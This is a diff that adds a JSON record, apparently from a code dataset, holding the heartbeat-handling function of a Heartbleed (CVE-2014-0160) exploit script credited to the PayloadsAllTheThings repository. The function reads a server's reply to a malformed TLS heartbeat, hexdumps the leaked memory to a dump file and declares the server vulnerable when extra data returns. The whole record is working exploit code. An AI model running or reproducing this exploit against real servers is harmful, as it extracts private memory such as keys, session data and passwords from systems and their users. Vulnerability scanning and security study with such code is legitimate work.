@@ -1,0 +1,7 @@
+{
+    "code": "def hit_hb(s, dumpf, host, quiet):\n\twhile True:\n\t\ttyp, ver, pay = recvmsg(s)\n\t\tif typ is None:\n\t\t\tprint('No heartbeat response received from '+host+', server likely not vulnerable')\n\t\t\treturn False\n\n\t\tif typ == 24:\n\t\t\tif not quiet: print('Received heartbeat response:')\n\t\t\thexdump(pay, dumpf, quiet)\n\t\t\tif len(pay) > 3:\n\t\t\t\tprint('WARNING: server '+ host +' returned more data than it should - server is vulnerable!')\n\t\t\telse:\n\t\t\t\tprint('Server '+host+' processed malformed heartbeat, but did not return any extra data.')\n\t\t\treturn True\n\n\t\tif typ == 21:\n\t\t\tif not quiet: print('Received alert:')\n\t\t\thexdump(pay, dumpf, quiet)\n\t\t\tprint('Server '+ host +' returned error, likely not vulnerable')\n\t\t\treturn False",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Heartbleed CVE-2014-0160.py",
+    "license": "MIT",
+    "language": "python"
+}
